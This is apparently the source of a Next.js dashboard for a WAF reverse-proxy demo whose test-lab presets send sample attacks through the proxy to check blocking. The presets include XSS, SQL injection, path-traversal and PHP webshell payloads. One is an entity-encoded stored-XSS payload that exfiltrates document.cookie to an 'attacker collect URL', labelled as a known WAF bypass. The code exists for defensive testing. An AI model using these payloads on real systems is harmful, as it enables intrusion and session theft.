'use client'

import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import type { FormEvent } from 'react'
import type {
  EventStoreSnapshot,
  OriginConfig,
  Policy,
  StoredEvent,
} from '@/lib/types'

type DashboardOrigin = OriginConfig & { policy: Policy }

type DashboardFlags = {
  useRealMl: boolean
  mlUrl: string | null
  writeToSupabase: boolean
  supabaseConfigured: boolean
  internalSecretSet: boolean
  configSource: 'env' | 'file'
}

export type DashboardProps = {
  origins: DashboardOrigin[]
  flags: DashboardFlags
  limits: { max: number; windowMs: number }
  defaultPolicy: Policy
}

type SendResult = {
  status: number
  text: string
  durationMs: number
  error?: string
}

type TestResult = {
  key: string
  label: string
  ok: boolean
  status: number | null
  expected: string
  durationMs: number
  detail: string
}

const PRESETS = [
  {
    key: 'normal',
    title: 'Normal GET through the proxy',
    desc: 'Fetches the first origin. Content should match the origin.',
    expect: '200',
  },
  {
    key: 'xss',
    title: 'XSS in query string',
    desc: 'Rule-based WAF rejects <script> before any ML/DB call.',
    expect: '403 xss',
  },
  {
    key: 'sqli',
    title: 'SQLi in POST body',
    desc: 'Body is inspected in the Node route, then blocked.',
    expect: '403 sqli',
  },
  {
    key: 'traversal',
    title: 'Path traversal',
    desc: '../../etc/passwd in the query string.',
    expect: '403 lfi',
  },
  {
    key: 'webshell',
    title: 'PHP webshell function',
    desc: "system('id') is a classic webshell signature.",
    expect: '403 php_rce',
  },
  {
    key: 'ratelimit',
    title: 'Rate limit burst',
    desc: 'Fires limit+10 HEADs from this IP at the same origin.',
    expect: '>=1 x 429',
  },
  {
    key: 'second',
    title: 'Second registered origin',
    desc: 'Routes to a different path prefix and a different origin.',
    expect: '200',
  },
  {
    key: 'cookie',
    title: 'Weak Set-Cookie inspection',
    desc: 'Origin sets a cookie without HttpOnly; only flags are logged.',
    expect: 'httponly=false',
  },
  {
    key: 'victim-login',
    title: 'Weak victim session cookie',
    desc: 'POSTs the victim login and checks the Set-Cookie flags the proxy recorded.',
    expect: 'httponly=false',
    victimOnly: true,
  },
  {
    key: 'victim-php',
    title: 'PHP webshell body',
    desc: 'POSTs <?php system(...) ?> to the victim PHP lab. The app never executes it.',
    expect: '403 php_rce',
    victimOnly: true,
  },
  {
    key: 'victim-stored',
    title: 'Stored XSS bypass (entity-encoded)',
    desc: 'Posts an entity-encoded ontoggle payload. Passes the WAF; open /chat to see it fire.',
    expect: '200 known gap',
    victimOnly: true,
  },
] as const

function formatTime(iso: string): string {
  return new Date(iso).toLocaleTimeString([], { hour12: false })
}

function statusColor(status: number): string {
  if (status >= 500) return 'var(--danger)'
  if (status >= 400) return 'var(--warn)'
  if (status >= 300) return 'var(--info)'
  return 'var(--accent)'
}

function flagText(flags: StoredEvent['set_cookie_flags']): string {
  if (!flags) return 'none'
  return `httponly=${flags.httponly} secure=${flags.secure} samesite=${flags.samesite ?? 'none'}`
}

function blockedRule(text: string): string {
  try {
    const parsed = JSON.parse(text) as { rule?: string; category?: string; error?: string }
    return [parsed.rule, parsed.category].filter(Boolean).join(' / ') || parsed.error || ''
  } catch {
    return text.replace(/\s+/g, ' ').slice(0, 100)
  }
}

async function waitForEvent(
  predicate: (event: StoredEvent) => boolean,
  timeoutMs = 10_000,
): Promise<StoredEvent | null> {
  const deadline = Date.now() + timeoutMs
  while (Date.now() < deadline) {
    try {
      const response = await fetch('/api/dashboard/events?limit=50', { cache: 'no-store' })
      if (response.ok) {
        const data = (await response.json()) as EventStoreSnapshot
        const found = data.events.find(predicate)
        if (found) return found
      }
    } catch {
      // Keep polling; the event write is asynchronous.
    }
    await new Promise((resolve) => setTimeout(resolve, 500))
  }
  return null
}

export default function Dashboard({ origins, flags, limits, defaultPolicy }: DashboardProps) {
  const [snapshot, setSnapshot] = useState<EventStoreSnapshot | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [running, setRunning] = useState<string | null>(null)
  const [results, setResults] = useState<TestResult[]>([])
  const [expanded, setExpanded] = useState<string | null>(null)
  const [customOrigin, setCustomOrigin] = useState(origins[0]?.path_prefix ?? '')
  const [customMethod, setCustomMethod] = useState('GET')
  const [customPath, setCustomPath] = useState('/get')
  const [customBody, setCustomBody] = useState('')
  const [targetKey, setTargetKey] = useState(origins[0]?.path_prefix ?? '')
  const [attackerUrl, setAttackerUrl] = useState('http://localhost:4100/collect')
  const [newUrl, setNewUrl] = useState('')
  const [newPrefix, setNewPrefix] = useState('')
  const [newHost, setNewHost] = useState('')
  const [newName, setNewName] = useState('')
  const [adding, setAdding] = useState(false)
  const [addError, setAddError] = useState<string | null>(null)
  const inFlight = useRef(false)

  const refresh = useCallback(async () => {
    if (inFlight.current) return
    inFlight.current = true
    try {
      const response = await fetch('/api/dashboard/events?limit=100', { cache: 'no-store' })
      if (!response.ok) throw new Error(`events API returned HTTP ${response.status}`)
      setSnapshot((await response.json()) as EventStoreSnapshot)
      setError(null)
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Could not reach the events API')
    } finally {
      inFlight.current = false
    }
  }, [])

  useEffect(() => {
    void refresh()
    const timer = window.setInterval(() => void refresh(), 2000)
    return () => window.clearInterval(timer)
  }, [refresh])

  const targetOrigin = useMemo(
    () => origins.find((origin) => origin.path_prefix === targetKey) ?? origins[0] ?? null,
    [origins, targetKey],
  )
  const isVictimTarget = Boolean(
    targetOrigin &&
      (targetOrigin.path_prefix.toLowerCase().includes('victim') ||
        targetOrigin.name.toLowerCase().includes('victim') ||
        targetOrigin.host),
  )
  const secondOrigin = useMemo(
    () => origins.find((origin) => origin.path_prefix === '/t/fast') ??
      origins.find((origin) => origin !== targetOrigin) ??
      null,
    [origins, targetOrigin],
  )
  const cookieOrigin = useMemo(
    () => origins.find((origin) => origin.path_prefix === '/t/echo') ?? null,
    [origins],
  )

  const counter = snapshot?.counters
  const stats = [
    { label: 'Requests seen', value: counter?.requests ?? 0 },
    { label: 'Blocked', value: counter?.blocked ?? 0 },
    { label: 'Rate limited', value: counter?.rate_limited ?? 0 },
    { label: 'ML flagged', value: counter?.ml_flagged ?? 0 },
    { label: 'Findings', value: counter?.findings ?? 0 },
    { label: 'Buffered events', value: `${snapshot?.events.length ?? 0}/${snapshot?.capacity ?? 200}` },
  ]

  async function send(path: string, init?: RequestInit): Promise<SendResult> {
    const started = performance.now()
    try {
      const response = await fetch(path, { ...init, cache: 'no-store' })
      const text = await response.text()
      return {
        status: response.status,
        text: text.slice(0, 5000),
        durationMs: Math.round(performance.now() - started),
      }
    } catch (err) {
      return {
        status: 0,
        text: '',
        durationMs: Math.round(performance.now() - started),
        error: err instanceof Error ? err.message : 'network error',
      }
    }
  }

  function record(result: TestResult) {
    setResults((previous) => [result, ...previous].slice(0, 12))
  }

  async function runPreset(key: (typeof PRESETS)[number]['key']) {
    if (running) return
    if (!targetOrigin && key !== 'second') {
      record({
        key,
        label: 'Preset unavailable',
        ok: false,
        status: null,
        expected: 'origin configured',
        durationMs: 0,
        detail: 'No origin is registered. Add one to config/origins.json.',
      })
      return
    }

    setRunning(key)
    try {
      if (key === 'normal' && targetOrigin) {
        const result = await send(targetOrigin.path_prefix)
        record({
          key,
          label: 'Normal GET through the proxy',
          ok: result.status === 200,
          status: result.status,
          expected: '200',
          durationMs: result.durationMs,
          detail: result.error ?? result.text.replace(/\s+/g, ' ').slice(0, 100),
        })
      }

      if (key === 'xss' && targetOrigin) {
        const target = `${targetOrigin.path_prefix}?q=${encodeURIComponent('<script>alert(1)</script>')}`
        const result = await send(target)
        record({
          key,
          label: 'XSS in query string',
          ok: result.status === 403 && result.text.includes('xss'),
          status: result.status,
          expected: '403 xss',
          durationMs: result.durationMs,
          detail: result.error ?? blockedRule(result.text),
        })
      }

      if (key === 'sqli' && targetOrigin) {
        const result = await send(`${targetOrigin.path_prefix}/echo`, {
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded' },
          body: "username=admin&password=x' UNION SELECT password FROM users--",
        })
        record({
          key,
          label: 'SQLi in POST body',
          ok: result.status === 403 && result.text.includes('sqli'),
          status: result.status,
          expected: '403 sqli',
          durationMs: result.durationMs,
          detail: result.error ?? blockedRule(result.text),
        })
      }

      if (key === 'traversal' && targetOrigin) {
        const result = await send(
          `${targetOrigin.path_prefix}?file=${encodeURIComponent('../../etc/passwd')}`,
        )
        record({
          key,
          label: 'Path traversal',
          ok: result.status === 403 && result.text.includes('lfi'),
          status: result.status,
          expected: '403 lfi',
          durationMs: result.durationMs,
          detail: result.error ?? blockedRule(result.text),
        })
      }

      if (key === 'webshell' && targetOrigin) {
        const result = await send(
          `${targetOrigin.path_prefix}?cmd=${encodeURIComponent("system('id')")}`,
        )
        record({
          key,
          label: 'PHP webshell function',
          ok: result.status === 403 && result.text.includes('php_rce'),
          status: result.status,
          expected: '403 php_rce',
          durationMs: result.durationMs,
          detail: result.error ?? blockedRule(result.text),
        })
      }

      if (key === 'victim-login' && targetOrigin) {
        const result = await send(`${targetOrigin.path_prefix}/api/login`, {
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded' },
          body: 'username=demo&password=demo123',
        })
        const event = await waitForEvent(
          (candidate) =>
            candidate.path.endsWith('/api/login') && candidate.cookie_count > 0,
        )
        const insecure = event?.set_cookie_flags?.httponly === false
        record({
          key,
          label: 'Weak victim session cookie',
          ok: (result.status === 200 || result.status === 303) && insecure,
          status: result.status,
          expected: 'httponly=false',
          durationMs: result.durationMs,
          detail: event
            ? `event ${event.id.slice(0, 8)}: ${flagText(event.set_cookie_flags)}`
            : result.error ?? 'No login cookie event observed yet — check the stream.',
        })
      }

      if (key === 'victim-php' && targetOrigin) {
        const result = await send(`${targetOrigin.path_prefix}/api/php`, {
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded' },
          body: `code=${encodeURIComponent("<?php system('id'); ?>")}`,
        })
        record({
          key,
          label: 'PHP webshell body',
          ok: result.status === 403 && result.text.includes('php'),
          status: result.status,
          expected: '403 php_rce',
          durationMs: result.durationMs,
          detail: result.error ?? blockedRule(result.text),
        })
      }

      if (key === 'victim-stored' && targetOrigin) {
        const payload =
          `&lt;details open ontoggle&#61;&quot;new Image().src&#61;'${attackerUrl}?c='` +
          `+encodeURIComponent(document.cookie)&quot;&gt;`
        const result = await send(`${targetOrigin.path_prefix}/api/comment`, {
          method: 'POST',
          headers: { 'content-type': 'application/x-www-form-urlencoded' },
          body: `text=${encodeURIComponent(payload)}`,
        })
        record({
          key,
          label: 'Stored XSS bypass (entity-encoded)',
          ok: result.status === 200 || result.status === 303,
          status: result.status,
          expected: '200 known gap',
          durationMs: result.durationMs,
          detail:
            'Stored. Open the victim /chat page in your browser and watch the attacker console. The proxy does not scan response bodies, so this one is a documented gap.',
        })
      }

      if (key === 'ratelimit' && targetOrigin) {
        const total = Math.max(55, limits.max + 10)
        const statuses = await Promise.all(
          Array.from({ length: total }, () =>
            fetch(`${targetOrigin.path_prefix}/__rate_limit_probe__`, {
              method: 'HEAD',
              cache: 'no-store',
            })
              .then((response) => response.status)
              .catch(() => 0),
          ),
        )
        const limited = statuses.filter((status) => status === 429).length
        record({
          key,
          label: 'Rate limit burst',
          ok: limited > 0,
          status: limited > 0 ? 429 : 200,
          expected: '>=1 x 429',
          durationMs: 0,
          detail: `${limited}/${total} requests returned 429 (limit ${limits.max} / ${Math.round(limits.windowMs / 1000)}s). Other origins are unaffected.`,
        })
      }

      if (key === 'second') {
        if (!secondOrigin) {
          record({
            key,
            label: 'Second registered origin',
            ok: false,
            status: null,
            expected: '200',
            durationMs: 0,
            detail: 'Only one origin is registered. Add a second entry to config/origins.json.',
          })
        } else {
          const result = await send(secondOrigin.path_prefix)
          record({
            key,
            label: 'Second registered origin',
            ok: result.status === 200,
            status: result.status,
            expected: '200',
            durationMs: result.durationMs,
            detail: `${secondOrigin.path_prefix} → ${secondOrigin.origin_url} · ${result.error ?? result.text.replace(/\s+/g, ' ').slice(0, 80)}`,
          })
        }
      }

      if (key === 'cookie') {
        if (!cookieOrigin) {
          record({
            key,
            label: 'Weak Set-Cookie inspection',
            ok: false,
            status: null,
            expected: 'httponly=false',
            durationMs: 0,
            detail: 'Add an origin at /t/echo (httpbin.org) to run this preset.',
          })
        } else {
          const target = `${cookieOrigin.path_prefix}/response-headers?Set-Cookie=${encodeURIComponent('session=demo; Path=/')}`
          const result = await send(target)
          const event =
            result.status === 200
              ? await waitForEvent(
                  (candidate) =>
                    candidate.path === `${cookieOrigin.path_prefix}/response-headers` &&
                    candidate.cookie_count > 0,
                )
              : null
          record({
            key,
            label: 'Weak Set-Cookie inspection',
            ok: result.status === 200 && Boolean(event) && event?.set_cookie_flags?.httponly === false,
            status: result.status,
            expected: 'httponly=false',
            durationMs: result.durationMs,
            detail: event
              ? `event ${event.id.slice(0, 8)}: ${flagText(event.set_cookie_flags)}`
              : result.error ?? 'No cookie event observed yet — check the stream below.',
          })
        }
      }
    } finally {
      setRunning(null)
      void refresh()
    }
  }

  async function runCustom() {
    if (!customOrigin) return
    const origin = origins.find((candidate) => candidate.path_prefix === customOrigin) ?? origins[0]
    if (!origin) return
    const suffix = customPath.startsWith('/') ? customPath : `/${customPath}`
    const target = `${origin.path_prefix}${suffix === '/' ? '/' : suffix}`
    const method = customMethod.toUpperCase()
    const body = method === 'GET' || method === 'HEAD' ? undefined : customBody

    setRunning('custom')
    try {
      const result = await send(target, {
        method,
        ...(body
          ? {
              body,
              headers: { 'content-type': 'application/x-www-form-urlencoded' },
            }
          : {}),
      })
      record({
        key: 'custom',
        label: `Custom ${method} ${target}`,
        ok: result.status > 0,
        status: result.status,
        expected: 'any response',
        durationMs: result.durationMs,
        detail:
          result.error ??
          (result.status === 0
            ? 'Network error'
            : result.text.replace(/\s+/g, ' ').slice(0, 140)),
      })
    } finally {
      setRunning(null)
      void refresh()
    }
  }

  async function addOrigin(event: FormEvent<HTMLFormElement>) {
    event.preventDefault()
    if (!newUrl.trim() || adding) return
    setAdding(true)
    setAddError(null)
    try {
      const response = await fetch('/api/origins', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          origin_url: newUrl.trim(),
          path_prefix: newPrefix.trim() || undefined,
          host: newHost.trim() || undefined,
          name: newName.trim() || undefined,
        }),
      })
      const data = (await response.json()) as { error?: string }
      if (!response.ok) {
        setAddError(data.error ?? `HTTP ${response.status}`)
        return
      }
      window.location.reload()
    } catch (error) {
      setAddError(error instanceof Error ? error.message : 'network error')
    } finally {
      setAdding(false)
    }
  }

  async function clearEvents() {
    if (!window.confirm('Clear the in-memory event feed and counters?')) return
    await fetch('/api/dashboard/events', { method: 'DELETE' })
    setExpanded(null)
    await refresh()
  }

  const visiblePresets = PRESETS.filter((preset) => {
    if (preset.key === 'cookie') return Boolean(cookieOrigin)
    if ('victimOnly' in preset && preset.victimOnly) return isVictimTarget
    return true
  })

  return (
    <main className="shell">
      <header className="topbar">
        <div className="brand">
          <div className="brand-mark">🛡</div>
          <div>
            <h1>ShieldForge / Proxy Control Room</h1>
            <div className="subtle tiny">
              Transparent path-prefix proxy · synchronous rule WAF · asynchronous ML detection
            </div>
          </div>
        </div>
        <div className="badges">
          <span className={`pill ${flags.useRealMl ? 'warn' : 'good'}`}>
            <span className="dot" />
            ML: <strong>{flags.useRealMl ? 'real service' : 'local mock'}</strong>
          </span>
          <span className={`pill ${flags.writeToSupabase ? 'warn' : 'info'}`}>
            <span className="dot" />
            DB: <strong>{flags.writeToSupabase ? 'Supabase' : 'console mock'}</strong>
          </span>
          <span className={`pill ${defaultPolicy.mode === 'enforce' ? 'bad' : 'info'}`}>
            <span className="dot" />
            Policy: <strong>{defaultPolicy.mode}</strong>
          </span>
          <span className="pill">
            Sync limit <strong>{limits.max}</strong> / {Math.round(limits.windowMs / 1000)}s
          </span>
          <span className="pill">
            Origins config: <strong>{flags.configSource}</strong>
          </span>
        </div>
      </header>

      {error ? <div className="notice">Events API: {error}. Is the dev server running?</div> : null}
      {flags.useRealMl && !flags.mlUrl ? (
        <div className="notice" style={{ marginTop: 12 }}>
          USE_REAL_ML=true but ML_SERVICE_URL is empty. Every classification will fail open to the
          local mock.
        </div>
      ) : null}
      {flags.writeToSupabase && !flags.supabaseConfigured ? (
        <div className="notice" style={{ marginTop: 12 }}>
          WRITE_TO_SUPABASE=true but the Supabase URL/service-role key is missing. Writes will be
          skipped; events still appear here.
        </div>
      ) : null}

      <section className="stats">
        {stats.map((stat) => (
          <div className="stat" key={stat.label}>
            <div className="stat-label">{stat.label}</div>
            <div className="stat-value">{stat.value}</div>
          </div>
        ))}
      </section>

      <div className="grid">
        <div className="stack">
          <section className="panel">
            <div className="panel-head">
              <div>
                <h2>Test Lab</h2>
                <div className="subtle tiny">
                  Each button maps to one acceptance test. Results appear here and in the event
                  stream.
                </div>
              </div>
              <button className="btn ghost" type="button" onClick={() => void refresh()}>
                Refresh stream
              </button>
            </div>
            <div className="panel-body">
              <div className="row" style={{ marginBottom: 14 }}>
                <div className="field">
                  <label htmlFor="target-origin">Target origin</label>
                  <select
                    id="target-origin"
                    value={targetOrigin?.path_prefix ?? ''}
                    onChange={(event) => setTargetKey(event.target.value)}
                  >
                    {origins.map((origin) => (
                      <option value={origin.path_prefix} key={origin.path_prefix}>
                        {origin.host ? `${origin.host} → ` : `${origin.path_prefix} → `}
                        {origin.origin_url}
                      </option>
                    ))}
                  </select>
                </div>
                <div className="field">
                  <label htmlFor="attacker-url">Attacker collect URL</label>
                  <input
                    id="attacker-url"
                    value={attackerUrl}
                    onChange={(event) => setAttackerUrl(event.target.value)}
                    placeholder="http://localhost:4100/collect"
                  />
                </div>
              </div>
              <div className="presets">
                {visiblePresets.map((preset) => (
                  <button
                    className="preset"
                    key={preset.key}
                    type="button"
                    disabled={running !== null || (preset.key !== 'second' && !targetOrigin)}
                    onClick={() => void runPreset(preset.key)}
                  >
                    <span>
                      <span className="preset-title">{preset.title}</span>
                      <span className="preset-desc">{preset.desc}</span>
                    </span>
                    <span className="expect">
                      {running === preset.key ? 'running…' : `expect ${preset.expect}`}
                    </span>
                  </button>
                ))}
              </div>

              {results.length > 0 ? (
                <>
                  <div className="divider" />
                  <h3>Last results</h3>
                  <div className="results">
                    {results.map((result, index) => (
                      <div className="result" key={`${result.key}-${index}`}>
                        <span className={`tag ${result.ok ? 'good' : 'bad'}`}>
                          {result.ok ? 'PASS' : 'FAIL'}
                        </span>
                        <span className="name">{result.label}</span>
                        <span className="meta">
                          {result.status ?? '—'} · {result.durationMs}ms
                        </span>
                        <span className="meta detail" title={result.detail}>
                          {result.detail}
                        </span>
                      </div>
                    ))}
                  </div>
                </>
              ) : null}
            </div>
          </section>

          <section className="panel">
            <div className="panel-head">
              <div>
                <h2>Live event stream</h2>
                <div className="subtle tiny">
                  In-memory demo feed · refreshed every 2s · cookie values never stored
                </div>
              </div>
              <div className="badges">
                <span className="pill info">
                  <span className="dot" />
                  auto-poll
                </span>
                <button className="btn ghost" type="button" onClick={() => void clearEvents()}>
                  Clear
                </button>
              </div>
            </div>
            <div className="events">
              {snapshot && snapshot.events.length > 0 ? (
                snapshot.events.map((event) => {
                  const isOpen = expanded === event.id
                  return (
                    <div key={event.id}>
                      <div
                        className={`event ${isOpen ? 'expanded' : ''}`}
                        role="button"
                        tabIndex={0}
                        onClick={() => setExpanded(isOpen ? null : event.id)}
                        onKeyDown={(keyboard) => {
                          if (keyboard.key === 'Enter' || keyboard.key === ' ') {
                            setExpanded(isOpen ? null : event.id)
                          }
                        }}
                      >
                        <span className="time">{formatTime(event.ts)}</span>
                        <span className="method">{event.method}</span>
                        <span className="path" title={`${event.path}${event.query ? `?${event.query}` : ''}`}>
                          {event.blocked_by ? <span className="blocked">⛔ </span> : null}
                          {event.path}
                          {event.query ? `?${event.query}` : ''}
                        </span>
                        <span className="status" style={{ color: statusColor(event.status_code) }}>
                          {event.status_code}
                        </span>
                        <span className="ml" title={`${event.ml_attack_class} ${event.ml_confidence}`}>
                          {event.rule_hit
                            ? `rule:${event.rule_hit}`
                            : `${event.ml_attack_class} ${Math.round(event.ml_confidence * 100)}%`}
                        </span>
                        <span className="flags">
                          {event.blocked_by ? (
                            <span className="tag bad">
                              {event.blocked_by === 'rate_limit' ? '429' : 'BLOCK'}
                            </span>
                          ) : null}
                          {event.cookie_count > 0 ? (
                            <span className={`tag ${event.set_cookie_flags?.httponly ? 'good' : 'warn'}`}>
                              cookie
                            </span>
                          ) : null}
                          {event.finding ? <span className="tag info">finding</span> : null}
                          {event.missing_security_headers.length > 0 ? (
                            <span className="tag muted">hdr-{event.missing_security_headers.length}</span>
                          ) : null}
                        </span>
                      </div>

                      {isOpen ? (
                        <div className="event-detail">
                          <div className="detail-grid">
                            <div className="detail">
                              <div className="k">Event</div>
                              <div className="v">{event.id}</div>
                            </div>
                            <div className="detail">
                              <div className="k">Origin</div>
                              <div className="v">{event.origin_prefix ?? 'unregistered'}</div>
                            </div>
                            <div className="detail">
                              <div className="k">Client IP</div>
                              <div className="v">{event.ip}</div>
                            </div>
                            <div className="detail">
                              <div className="k">Duration</div>
                              <div className="v">{event.duration_ms}ms</div>
                            </div>
                            <div className="detail">
                              <div className="k">Rule</div>
                              <div className="v">{event.rule_hit ?? 'none'}</div>
                            </div>
                            <div className="detail">
                              <div className="k">Blocked by</div>
                              <div className="v">{event.blocked_by ?? 'not blocked'}</div>
                            </div>
                            <div className="detail">
                              <div className="k">ML decision</div>
                              <div className="v">
                                {event.ml_attack_class} · {event.ml_confidence} · risk{' '}
                                {event.ml_risk_score}
                              </div>
                            </div>
                            <div className="detail">
                              <div className="k">ML source</div>
                              <div className="v">
                                {event.ml_source}
                                {event.ml_error ? ` (${event.ml_error})` : ''}
                              </div>
                            </div>
                            <div className="detail">
                              <div className="k">Cookie flags</div>
                              <div className="v">{flagText(event.set_cookie_flags)}</div>
                            </div>
                            <div className="detail">
                              <div className="k">Missing security headers</div>
                              <div className="v">
                                {event.missing_security_headers.length > 0
                                  ? event.missing_security_headers.join(', ')
                                  : 'none'}
                              </div>
                            </div>
                            <div className="detail">
                              <div className="k">Finding</div>
                              <div className="v">
                                {event.finding
                                  ? `${event.finding.severity} · ${event.finding.category} · ${event.finding.title}`
                                  : 'none'}
                              </div>
                            </div>
                            <div className="detail">
                              <div className="k">Incident</div>
                              <div className="v">
                                {event.incident
                                  ? `${event.incident.action_taken} · ${event.incident.confidence}`
                                  : 'none'}
                              </div>
                            </div>
                          </div>
                          <pre>{JSON.stringify(event, null, 2)}</pre>
                        </div>
                      ) : null}
                    </div>
                  )
                })
              ) : (
                <div className="empty">
                  No events yet. Run a preset above, or open{' '}
                  <code>{origins[0]?.path_prefix ?? '/t/shop'}</code> in a new tab.
                  <br />
                  <span className="tiny">
                    Blocked requests are recorded through the internal events sink. Normal requests
                    are recorded in <code>after()</code>.
                  </span>
                </div>
              )}
            </div>
          </section>
        </div>

        <div className="stack">
          <section className="panel">
            <div className="panel-head">
              <h2>Registered origins</h2>
              <span className="pill">{origins.length} active</span>
            </div>
            <div className="panel-body">
              {origins.length === 0 ? (
                <div className="empty">No valid origins. Check config/origins.json.</div>
              ) : (
                <div className="origins">
                  {origins.map((origin) => (
                    <div className="origin" key={origin.path_prefix}>
                      <div>
                        <div className="prefix">{origin.path_prefix}</div>
                        <div className="tiny">{origin.name}</div>
                        {origin.host ? <div className="tiny muted">host: {origin.host}</div> : null}
                        <div className="url">{origin.origin_url}</div>
                        <div className="tiny muted">
                          id {origin.origin_id ?? 'not set'} · {origin.policy.mode} · block at{' '}
                          {Math.round(origin.policy.auto_block_threshold * 100)}%
                        </div>
                      </div>
                      <a
                        className="btn ghost"
                        href={origin.host ? `//${origin.host}` : origin.path_prefix}
                        target="_blank"
                        rel="noreferrer"
                      >
                        Open ↗
                      </a>
                    </div>
                  ))}
                </div>
              )}

              <div className="divider" />
              <h3>Add origin</h3>
              <form className="form" onSubmit={addOrigin}>
                <div className="field">
                  <label htmlFor="new-url">Origin URL</label>
                  <input
                    id="new-url"
                    value={newUrl}
                    onChange={(event) => setNewUrl(event.target.value)}
                    placeholder="https://victim-shop.vercel.app/t/victim-shop"
                  />
                </div>
                <div className="row">
                  <div className="field">
                    <label htmlFor="new-prefix">Path prefix (optional with host)</label>
                    <input
                      id="new-prefix"
                      value={newPrefix}
                      onChange={(event) => setNewPrefix(event.target.value)}
                      placeholder="/t/victim-shop"
                    />
                  </div>
                  <div className="field">
                    <label htmlFor="new-host">Host routing (optional)</label>
                    <input
                      id="new-host"
                      value={newHost}
                      onChange={(event) => setNewHost(event.target.value)}
                      placeholder="victim.local"
                    />
                  </div>
                </div>
                <div className="field">
                  <label htmlFor="new-name">Display name</label>
                  <input
                    id="new-name"
                    value={newName}
                    onChange={(event) => setNewName(event.target.value)}
                    placeholder="Victim Shop"
                  />
                </div>
                <button className="btn primary" type="submit" disabled={adding || !newUrl.trim()}>
                  {adding ? 'Probing origin…' : 'Add origin'}
                </button>
                {addError ? <div className="notice">{addError}</div> : null}
                <div className="subtle tiny">
                  The proxy probes the URL before adding it. Runtime additions are lost on restart;
                  on Vercel put the origin in <code>ORIGINS_JSON</code>. Private/local URLs need{' '}
                  <code>ALLOW_PRIVATE_ORIGINS=true</code>.
                </div>
              </form>
            </div>
          </section>

          <section className="panel">
            <div className="panel-head">
              <h2>Custom request</h2>
              <span className="pill info">sends through proxy</span>
            </div>
            <div className="panel-body">
              <div className="form">
                <div className="field">
                  <label htmlFor="custom-origin">Origin prefix</label>
                  <select
                    id="custom-origin"
                    value={customOrigin}
                    onChange={(event) => setCustomOrigin(event.target.value)}
                  >
                    {origins.map((origin) => (
                      <option value={origin.path_prefix} key={origin.path_prefix}>
                        {origin.path_prefix} → {origin.origin_url}
                      </option>
                    ))}
                  </select>
                </div>
                <div className="row">
                  <div className="field">
                    <label htmlFor="custom-method">Method</label>
                    <select
                      id="custom-method"
                      value={customMethod}
                      onChange={(event) => setCustomMethod(event.target.value)}
                    >
                      {['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD'].map((method) => (
                        <option value={method} key={method}>
                          {method}
                        </option>
                      ))}
                    </select>
                  </div>
                  <div className="field">
                    <label htmlFor="custom-path">Path + query</label>
                    <input
                      id="custom-path"
                      value={customPath}
                      onChange={(event) => setCustomPath(event.target.value)}
                      placeholder="/get?x=1"
                    />
                  </div>
                </div>
                <div className="field">
                  <label htmlFor="custom-body">Body (non-GET/HEAD)</label>
                  <textarea
                    id="custom-body"
                    value={customBody}
                    onChange={(event) => setCustomBody(event.target.value)}
                    placeholder="username=admin&password=demo"
                  />
                </div>
                <button
                  className="btn primary"
                  type="button"
                  disabled={running !== null || !customOrigin}
                  onClick={() => void runCustom()}
                >
                  {running === 'custom' ? 'Sending…' : 'Send through proxy'}
                </button>
              </div>
            </div>
          </section>

          <section className="panel">
            <div className="panel-head">
              <h2>Policy (Boundary 4)</h2>
              <span className="pill info">{defaultPolicy.mode}</span>
            </div>
            <div className="panel-body">
              <div className="detail-grid">
                <div className="detail">
                  <div className="k">Auto block threshold</div>
                  <div className="v">{defaultPolicy.auto_block_threshold}</div>
                </div>
                <div className="detail">
                  <div className="k">Alert threshold</div>
                  <div className="v">{defaultPolicy.alert_threshold}</div>
                </div>
                <div className="detail">
                  <div className="k">Mode</div>
                  <div className="v">{defaultPolicy.mode}</div>
                </div>
              </div>
              <div className="tiny muted" style={{ marginTop: 10 }}>
                Rule-based WAF blocks in both modes. In <code>shadow</code>, a high-confidence ML
                detection is logged and alerted but not enforced. In <code>enforce</code>, that IP
                is temp-blocked for the <em>next</em> request — the current request already has a
                response. Set <code>POLICY_MODE=enforce</code> to demo it.
              </div>
            </div>
          </section>

          <section className="panel">
            <div className="panel-head">
              <h2>Why this design</h2>
              <span className="pill good">
                <span className="dot" />
                fail-open
              </span>
            </div>
            <div className="panel-body">
              <div className="help">
                <div className="help-item">
                  <strong>1 · Sync edge checks</strong>
                  <span>Middleware handles rate limit + path/query rules and returns 403/429 with zero ML or DB dependency.</span>
                </div>
                <div className="help-item">
                  <strong>2 · Proxy + body WAF</strong>
                  <span>The Node route repeats the rule check for request bodies, then streams the origin response straight back.</span>
                </div>
                <div className="help-item">
                  <strong>3 · Async enrichment</strong>
                  <span>After the response, <code>after()</code> calls classify, writes an event and maybe a finding/incident.</span>
                </div>
                <div className="help-item">
                  <strong>4 · Fail-open by default</strong>
                  <span>If the ML service is dead, classification falls back to the mock and rule blocking still works.</span>
                </div>
              </div>
              <div className="divider" />
              <div className="tiny muted">
                Dashboard state is in-memory for the demo. Set <code>WRITE_TO_SUPABASE=true</code>{' '}
                and the shared keys to persist Boundary 2 rows. Internal blocked-event sink:{' '}
                {flags.internalSecretSet ? 'secret-protected' : 'open (demo) — set PROXY_SHARED_SECRET'}.
              </div>
            </div>
          </section>
        </div>
      </div>

      <footer className="footer">
        <span>
          Last poll: {snapshot?.now ? formatTime(snapshot.now) : 'waiting for first poll'} · buffer{' '}
          {snapshot?.events.length ?? 0}/{snapshot?.capacity ?? 200} · blocked IPs{' '}
          {snapshot?.blocked_ips.length ?? 0}
        </span>
        <span>ShieldForge Part 1 · reverse proxy &amp; edge enforcement</span>
      </footer>
    </main>
  )
}
